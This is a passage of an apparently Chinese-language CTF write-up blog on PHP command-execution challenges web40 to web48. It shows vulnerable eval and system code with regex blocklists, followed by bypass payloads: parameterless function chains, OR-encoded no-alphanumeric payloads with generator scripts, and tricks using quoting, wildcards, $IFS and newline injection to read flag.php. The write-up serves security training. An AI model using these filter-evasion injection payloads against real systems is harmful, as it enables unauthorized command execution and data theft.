class="headerlink" title="12. web40"></a>12. web40</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无参函数构造</p><p><a href="../../ZDemo/PHP%20%E8%AF%AD%E8%A8%80/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/PHP%20%E6%97%A0%E5%8F%82%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md">PHP 无参命令执行</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token function">sinh</span><span class="token punctuation">(</span><span class="token function">cosh</span><span class="token punctuation">(</span><span class="token function">tan</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">tan</span><span class="token punctuation">(</span><span class="token function">umask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="13-web41"><a href="#13-web41" class="headerlink" title="13. web41"></a>13. web41</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤掉了数字与字母，通过或运算获得所需的内容</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神链接</a></p><p>main.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token string">""</span>    s2 <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"or_rce.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            t <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> t <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>                s1 <span class="token operator">+=</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                s2 <span class="token operator">+=</span> t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> <span class="token string">"(\""</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> <span class="token string">"\"|\""</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">"\")"</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">";"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>or.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"or_rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token comment">//根据题目给的正则表达式修改即可</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 main.py 获得 payload</p><p><img src="/../../../pic/Pasted%20image%2020221020150005.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[POST]("%13%08%05%0c%0c%00%05%18%05%03"|"%60%60%60%60%60%5f%60%60%60%60")("%14%01%03%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="14-web42"><a href="#14-web42" class="headerlink" title="14. web42"></a>14. web42</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不会进行输出</p><p>&gt; 代表重定向到哪里<br>/dev/null 代表空设备文件<br>2&gt; 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>1 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1</p><p>本题语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p><p>补充：<br>0表示键盘输入，1表示屏幕输出，2表示错误输出！<br>‘ &gt; ’ 默认标准输出重定向，与1&gt;相同<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出<br>&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中</p><p>可以将命令闭合掉执行命令</p><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>GET<span class="token punctuation">]</span>?c<span class="token operator">=</span>tac flag.php <span class="token operator">||</span>?c<span class="token operator">=</span>tac flag.php<span class="token punctuation">;</span>?c<span class="token operator">=</span>tac flag.php%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="15-web43"><a href="#15-web43" class="headerlink" title="15. web43"></a>15. web43</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤掉了分号与cat不影响</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac flag.php<span class="token operator">||</span>?c<span class="token operator">=</span>tac flag.php%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="16-web44"><a href="#16-web44" class="headerlink" title="16. web44"></a>16. web44</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/;|cat|flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用通配符或者拼接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>GET<span class="token punctuation">]</span>?c<span class="token operator">=</span>tac <span class="token string">'fla'</span>'g.php'%0a?c<span class="token operator">=</span>tac fl*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="17-web45"><a href="#17-web45" class="headerlink" title="17. web45"></a>17. web45</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| /i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤掉了空格，使用其他的进行替代</p><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac%09<span class="token string">'fla'</span>'g.php<span class="token string">'||?c=tac$IFS'</span>fla<span class="token string">''</span>g.php<span class="token string">'||?c=tac$IFS$9'</span>fla<span class="token string">''</span>g.php'<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="18-web46"><a href="#18-web46" class="headerlink" title="18. web46"></a>18. web46</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac<span class="token operator">&lt;&gt;</span><span class="token string">'fla'</span>'g.php<span class="token string">'||?c=tac&lt;'</span>fla<span class="token string">''</span>g.php<span class="token string">'||?c=tac%09'</span>fla<span class="token string">''</span>g.php'<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="19-web47"><a href="#19-web47" class="headerlink" title="19. web47"></a>19. web47</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac<span class="token operator">&lt;&gt;</span><span class="token string">'fla'</span>'g.php<span class="token string">'||?c=tac&lt;'</span>fla<span class="token string">''</span>g.php<span class="token string">'||?c=tac%09'</span>fla<span class="token string">''</span>g.php'<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="20-web48"><a href="#20-web48" class="headerlink" title="20. web48"></a>20. web48</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac<span class="token operator">&lt;&gt;</span><span class="token string">'fla'</span>'g.php<span class="token string">'||?c=tac&lt;'</span>fla<span class="token string">''</span>g.php<span class="token string">'||?c=tac%09'</span>fla<span class="token string">''</span>g.php'<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 